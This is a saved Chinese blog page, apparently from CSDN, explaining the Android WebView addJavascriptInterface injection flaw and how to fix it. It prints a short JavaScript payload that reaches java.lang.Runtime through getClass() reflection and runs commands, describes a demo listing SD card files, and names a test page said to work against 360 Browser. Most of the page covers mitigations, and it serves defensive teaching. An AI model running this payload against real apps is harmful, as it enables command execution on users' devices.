+</div>
+<div><strong>简单说明一下</strong></div>
+<div>1，请看<strong>execute()</strong>这个方法，它遍历所有window的对象，然后找到包含getClass方法的对象，利用这个对象的类，找到java.lang.Runtime对象，然后调用“getRuntime”静态方法方法得到Runtime的实例，再调用exec()方法来执行某段命令。</div>
+<div>2，getContents()方法，从流中读取内容，显示在界面上。</div>
+<div>3，关键的代码就是以下两句</div>
+<div>
+<div class="dp-highlighter bg_javascript"><div class="bar"><div class="tools"><b>[javascript]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 877px; top: 4230px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_4" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_4" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=4&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-c"><li class="alt"><span><span class="keyword">return</span><span>&nbsp;window[obj].getClass().forName(</span><span class="string">"java.lang.Runtime"</span><span>).&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getMethod(<span class="string">"getRuntime"</span><span>,</span><span class="keyword">null</span><span>).invoke(</span><span class="keyword">null</span><span>,</span><span class="keyword">null</span><span>).exec(cmdArgs);&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="javascript" style="display: none;">return window[obj].getClass().forName("java.lang.Runtime").
+                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);</pre>
+</div>
+<div>Java代码实现如下：</div>
+<div>
+<div class="dp-highlighter bg_java"><div class="bar"><div class="tools"><b>[java]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 840px; top: 4378px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_5" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_5" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=5&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-j"><li class="alt"><span><span>mWebView&nbsp;=&nbsp;(WebView)&nbsp;findViewById(R.id.webview);&nbsp;&nbsp;</span></span></li><li class=""><span>mWebView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span><span>);&nbsp;&nbsp;</span></span></li><li class="alt"><span>mWebView.addJavascriptInterface(<span class="keyword">new</span><span>&nbsp;JSInterface(),&nbsp;</span><span class="string">"jsInterface"</span><span>);&nbsp;&nbsp;</span></span></li><li class=""><span>mWebView.loadUrl(<span class="string">"file:///android_asset/html/test.html"</span><span>);&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="java" style="display: none;">mWebView = (WebView) findViewById(R.id.webview);
+mWebView.getSettings().setJavaScriptEnabled(true);
+mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");
+mWebView.loadUrl("file:///android_asset/html/test.html");
+</pre>
+需要添加的权限：</div>
+<div>
+<div class="dp-highlighter bg_html"><div class="bar"><div class="tools"><b>[html]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 842px; top: 4562px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_6" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_6" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=6&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-xml"><li class="alt"><span><span class="tag">&lt;</span><span class="tag-name">uses-permission</span><span>&nbsp;</span><span class="attribute">android:name</span><span>=</span><span class="attribute-value">"android.permission.INTERNET"</span><span class="tag">/&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span><span class="tag">&lt;</span><span class="tag-name">uses-permission</span><span>&nbsp;</span><span class="attribute">android:name</span><span>=</span><span class="attribute-value">"android.permission.ACCESS_NETWORK_STATE"</span><span>&nbsp;</span><span class="tag">/&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span><span class="tag">&lt;</span><span class="tag-name">uses-permission</span><span>&nbsp;</span><span class="attribute">android:name</span><span>=</span><span class="attribute-value">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span>&nbsp;</span><span class="tag">/&gt;</span><span>&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="html" style="display: none;">&lt;uses-permission android:name="android.permission.INTERNET"/&gt;
+&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
+&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;</pre>
+当点击LOAD菜单后，运行截图如下：（理论上应该出现图一界面）</div>
+<div><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/20130918160648921" alt=""><br>
+</div>
+<div>图二：实际运行结果，列出了SDCard中的文件</div>
+<div><br>
+</div>
+<div><strong>举例二：</strong>360浏览器也存在这个问题，我测试的系统是android 4.0.2，360浏览器版本是：4.8.7</div>
+<div>在浏览器输入框中输入：http://bitkiller.duapp.com/jsobj.html，然后前往，它会出现如下的界面</div>
+<div><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/20130922215131953" alt=""><br>
+</div>
+<div>图三：360浏览器运行结果</div>
+<div><strong><em>说明：其中searchBoxJavaBridge_不是360注入的对象，而是WebView内部注入的，这是在3.0以后的Android系统上添加的。</em></strong></div>
+<div><br>
+</div>
+<div>在关闭这个对话框之后，它会列出当前SDCard上面的所有文件列表，如下图所示</div>
+<div><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/20130922215117265" alt=""><br>
+</div>
+<div>图四：错误结果</div>
+<div><br>
+</div>
+<h2><a name="t3"></a>4，解决方案</h2>
+<div>1，Android 4.2以上的系统</div>
+<div>在Android 4.2以上的，google作了修正，通过在Java的远程方法上面声明一个@JavascriptInterface，如下面代码：</div>
+<div>
+<div class="dp-highlighter bg_java"><div class="bar"><div class="tools"><b>[java]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 840px; top: 6966px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_7" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_7" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=7&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-j"><li class="alt"><span><span class="keyword">class</span><span>&nbsp;JsObject&nbsp;{&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;<span class="annotation">@JavascriptInterface</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="keyword">public</span><span>&nbsp;String&nbsp;toString()&nbsp;{&nbsp;</span><span class="keyword">return</span><span>&nbsp;</span><span class="string">"injectedObject"</span><span>;&nbsp;}&nbsp;&nbsp;</span></span></li><li class=""><span>}&nbsp;&nbsp;</span></li><li class="alt"><span>webView.addJavascriptInterface(<span class="keyword">new</span><span>&nbsp;JsObject(),&nbsp;</span><span class="string">"injectedObject"</span><span>);&nbsp;&nbsp;</span></span></li><li class=""><span>webView.loadData(<span class="string">""</span><span>,&nbsp;</span><span class="string">"text/html"</span><span>,&nbsp;</span><span class="keyword">null</span><span>);&nbsp;&nbsp;</span></span></li><li class="alt"><span>webView.loadUrl(<span class="string">"javascript:alert(injectedObject.toString())"</span><span>);&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="java" style="display: none;">class JsObject {
+   @JavascriptInterface
+   public String toString() { return "injectedObject"; }
+}
+webView.addJavascriptInterface(new JsObject(), "injectedObject");
+webView.loadData("", "text/html", null);
+webView.loadUrl("javascript:alert(injectedObject.toString())");</pre>
+2，Android 4.2以下的系统</div>
+<div>这个问题比较难解决，但也不是不能解决。</div>
+<div>首先，我们肯定不能再调用addJavascriptInterface方法了。关于这个问题，最核心的就是要知道JS事件这一个动作，JS与Java进行交互我们知道，有以下几种，比prompt, alert等，这样的动作都会对应到<strong><em>WebChromeClient</em></strong>类中相应的方法，对于prompt，它对应的方法是<strong><em>onJsPrompt</em></strong>方法，这个方法的声明如下：</div>
+<div>
+<div class="dp-highlighter bg_java"><div class="bar"><div class="tools"><b>[java]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 840px; top: 7308px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_8" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_8" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=8&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-j"><li class="alt"><span><span class="keyword">public</span><span>&nbsp;</span><span class="keyword">boolean</span><span>&nbsp;onJsPrompt(WebView&nbsp;view,&nbsp;String&nbsp;url,&nbsp;String&nbsp;message,&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;defaultValue,&nbsp;JsPromptResult&nbsp;result)&nbsp;&nbsp;</span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="java" style="display: none;">public boolean onJsPrompt(WebView view, String url, String message, 
+    String defaultValue, JsPromptResult result)</pre>
+</div>
+<div>通过这个方法，JS能把信息（文本）传递到Java，而Java也能把信息（文本）传递到JS中，通知这个思路我们能不能找到解决方案呢？</div>
+<div>经过一番尝试与分析，找到一种比较可行的方案，请看下面几个小点：</div>
+<div>【1】让JS调用一个Javascript方法，这个方法中是调用prompt方法，通过prompt把JS中的信息传递过来，这些信息应该是我们组合成的一段有意义的文本，可能包含：<strong><span style="color:#ff0000">特定标识，方法名称，参数</span></strong>等。在<strong><em>onJsPrompt</em></strong>方法中，我们去解析传递过来的文本，得到方法名，参数等，再通过反射机制，调用指定的方法，从而调用到Java对象的方法。</div>
+<div>【2】关于返回值，可以通过prompt返回回去，这样就可以把Java中方法的处理结果返回到Js中。</div>
+<div>【3】我们需要动态生成一段声明Javascript方法的JS脚本，通过loadUrl来加载它，从而注册到html页面中，具体的代码如下：</div>
+<div>
+<div class="dp-highlighter bg_javascript"><div class="bar"><div class="tools"><b>[javascript]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 877px; top: 7690px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_9" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_9" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=9&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-c"><li class="alt"><span><span>javascript:(</span><span class="keyword">function</span><span>&nbsp;JsAddJavascriptInterface_(){&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>&nbsp;(</span><span class="keyword">typeof</span><span>(window.jsInterface)!=</span><span class="string">'undefined'</span><span>)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(<span class="string">'window.jsInterface_js_interface_name&nbsp;is&nbsp;exist!!'</span><span>);}&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span><span>&nbsp;{&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;window.jsInterface&nbsp;=&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onButtonClick:<span class="keyword">function</span><span>(arg0)&nbsp;{&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span><span>&nbsp;prompt(</span><span class="string">'MyApp:'</span><span>+JSON.stringify({obj:</span><span class="string">'jsInterface'</span><span>,func:</span><span class="string">'onButtonClick'</span><span>,args:[arg0]}));&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onImageClick:<span class="keyword">function</span><span>(arg0,arg1,arg2)&nbsp;{&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prompt(<span class="string">'MyApp:'</span><span>+JSON.stringify({obj:</span><span class="string">'jsInterface'</span><span>,func:</span><span class="string">'onImageClick'</span><span>,args:[arg0,arg1,arg2]}));&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class="alt"><span>}&nbsp;&nbsp;</span></li><li class=""><span>)()&nbsp;&nbsp;</span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="javascript" style="display: none;">javascript:(function JsAddJavascriptInterface_(){
+    if (typeof(window.jsInterface)!='undefined') {    
+        console.log('window.jsInterface_js_interface_name is exist!!');} 
+    else {
+        window.jsInterface = {        
+            onButtonClick:function(arg0) { 
+                return prompt('MyApp:'+JSON.stringify({obj:'jsInterface',func:'onButtonClick',args:[arg0]}));
+            },
+            
+            onImageClick:function(arg0,arg1,arg2) { 
+                prompt('MyApp:'+JSON.stringify({obj:'jsInterface',func:'onImageClick',args:[arg0,arg1,arg2]}));
+            },
+        };
+    }
+}
+)()</pre>
+</div>
+<div><strong>说明：</strong></div>
+<div>1，上面代码中的<strong><em>jsInterface</em></strong>就是要注册的对象名，它注册了两个方法，<strong><em>onButtonClick(arg0)和onImageClick(arg0, arg1, arg2)</em></strong>，如果有返回值，就添加上return。</div>
+<div>2，prompt中是我们约定的字符串，它包含特定的标识符<strong><em>MyApp:</em></strong>，后面包含了一串JSON字符串，它包含了<strong><em>方法名，参数，对象名</em></strong>等。</div>
+<div>3，当JS调用onButtonClick或onImageClick时，就会回调到Java层中的<strong><em>onJsPrompt</em></strong>方法，我们再解析出方法名，参数，对象名，再反射调用方法。<br>
+4，window.jsInterface这表示在window上声明了一个Js对象，声明方法的形式是：<strong>方法名:function(参数1，参数2)&nbsp;</strong></div>
+<div><br>
+</div>
+<h2><a name="t4"></a>5，一些思考</h2>
+<div>以下是在实现这个解决方案过程中遇到的一些问题和思考：</div>
+<div><strong>【1】生成Js方法后，加载这段Js的时机是什么？</strong></div>
+<div>刚开始时在当WebView正常加载URL后去加载Js，但发现会存在问题，如果当WebView跳转到下一个页面时，之前加载的Js就可能无效了，所以需要再次加载。这个问题经过尝试，需要在以下几个方法中加载Js，它们是WebChromeClient和WebViewClient的方法：</div>
+<div>
+<ul>
+<li>onLoadResource</li><li>doUpdateVisitedHistory</li><li>onPageStarted</li><li>onPageFinished</li><li>onReceivedTitle</li><li>onProgressChanged</li></ul>
+</div>
+<div><em><strong><span style="color:#ff0000">目前测试了这几个地方，没什么问题，这里我也不能完全确保没有问题。</span></strong></em></div>
+<div><br>
+</div>
+<div><strong>【2】需要过滤掉Object类的方法</strong></div>
+<div>由于通过反射的形式来得到指定对象的方法，他会把基类的方法也会得到，最顶层的基类就是Object，所以我们为了不把getClass方法注入到Js中，所以我们需要把Object的公有方法过滤掉。这里严格说来，应该有一个需要过滤方法的列表。目前我的实现中，需要过滤的方法有：</div>
+<div>&nbsp; &nbsp; &nbsp; &nbsp; "getClass",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "hashCode",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "notify",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "notifyAll",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "equals",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "toString",<br>
+&nbsp; &nbsp; &nbsp; &nbsp; "wait",<br>
+</div>
+<div><br>
+</div>
+<div><strong>【3】通过手动loadUrl来加载一段js，这种方式难道js中的对象就不在window中吗？也就是说，通过遍历window的对象，不能找到我们通过loadUrl注入的js对象吗？</strong></div>
+<div>关于这个问题，我们的方法是通过Js声明的，通过loadUrl的形式来注入到页面中，其实本质相当于把我们这动态生成的这一段Js直接写在Html页面中，所以，这些Js中的window中虽然包含了我们声明的对象，但是他们并不是Java对象，他们是通过Js语法声明的，所以不存在getClass之类的方法。本质上他们是Js对象。</div>
+<div><br>
+</div>
+<div><strong>【4】在Android 3.0以下，系统自己添加了一个叫searchBoxJavaBridge_的Js接口，要解决这个安全问题，我们也需要把这个接口删除，调用removeJavascriptInterface方法。这个searchBoxJavaBridge_好像是跟google的搜索框相关的。</strong></div>
+<div><br>
+</div>
+<div><strong>【5】在实现过程中，我们需要判断系统版本是否在<span style="color:#ff0000">4.2</span>以下，因为在4.2以上，Android修复了这个安全问题。我们只是需要针对4.2以下的系统作修复。</strong></div>
+<div><br>
+</div>
+<div><br>
+</div>
+<div><span style="font-size:18px">转载请注明出处，谢谢大家！！！</span></div>
+<div><span style="font-size:18px"><br>
+</span></div>
+<div><a target="_blank" href="http://download.csdn.net/detail/leehong2005/6341685"><span style="font-size:24px; color:rgb(255,0,0)">源码下载</span></a></div>
+   
+</div>
+
+
+
+
+<!-- Baidu Button BEGIN -->
+
+
+
+
+<div class="bdsharebuttonbox tracking-ad bdshare-button-style0-16" style="float: right;" data-mod="popu_172" data-bd-bind="1470896108609">
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_more" data-cmd="more" style="background-position:0 0 !important; background-image: url(http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png) !important" target="_blank"></a>
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间" style="background-position:0 -52px !important" target="_blank"></a>
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博" style="background-position:0 -104px !important" target="_blank"></a>
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博" style="background-position:0 -260px !important" target="_blank"></a>
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_renren" data-cmd="renren" title="分享到人人网" style="background-position:0 -208px !important" target="_blank"></a>
+<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="bds_weixin" data-cmd="weixin" title="分享到微信" style="background-position:0 -1612px !important" target="_blank"></a>
+</div>
+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+<!-- Baidu Button END -->
+
+   <link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/blog_detail.css">
+
+    
+<!--172.16.140.11-->
+
+<!-- Baidu Button BEGIN -->
+<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=1536434" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/bds_s_v2.js"></script>
+
+<script type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</script>
+<!-- Baidu Button END -->
+
+ 
+
+        <div id="digg" articleid="11808557">
+            <dl id="btnDigg" class="digg digg_disable" onclick="btndigga();">
+               
+                 <dt>顶</dt>
+                <dd>26</dd>
+            </dl>
+           
+              
+            <dl id="btnBury" class="digg digg_disable" onclick="btnburya();">
+              
+                  <dt>踩</dt>
+                <dd>1</dd>               
+            </dl>
+            
+        </div>
+     <div class="tracking-ad" data-mod="popu_222"><a href="javascript:void(0);" target="_blank">&nbsp;</a>   </div>
+    <div class="tracking-ad" data-mod="popu_223"> <a href="javascript:void(0);" target="_blank">&nbsp;</a></div>
+    <script type="text/javascript">
+                function btndigga() {
+                    $(".tracking-ad[data-mod='popu_222'] a").click();
+                }
+                function btnburya() {
+                    $(".tracking-ad[data-mod='popu_223'] a").click();
+                }
+            </script>
+
+   <ul class="article_next_prev">
+                <li class="prev_article"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_shangyipian&#39;]);location.href=&#39;/leehong2005/article/details/9407111&#39;;">上一篇</span><a href="http://blog.csdn.net/leehong2005/article/details/9407111" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_shangyipian&#39;])">Android java.lang.NoClassDefFoundError的一种解决方法</a></li>
+                <li class="next_article"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_xiayipian&#39;]);location.href=&#39;/leehong2005/article/details/12567757&#39;;">下一篇</span><a href="http://blog.csdn.net/leehong2005/article/details/12567757" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_xiayipian&#39;])">Android 下拉刷新框架实现</a></li>
+    </ul>
+
+    <div style="clear:both; height:10px;"></div>
+
+
+        <div class="similar_article" style="">
+                <h4>我的同类文章</h4>
+                <div class="similar_c" style="margin:20px 0px 0px 0px">
+                    <div class="similar_c_t">
+                                <label class="similar_cur">
+                                    <span style="cursor:pointer" onclick="GetCategoryArticles(&#39;1086396&#39;,&#39;leehong2005&#39;,&#39;foot&#39;,&#39;11808557&#39;);">Android<em>（44）</em></span>
+                                </label>
+                    </div>
+                   
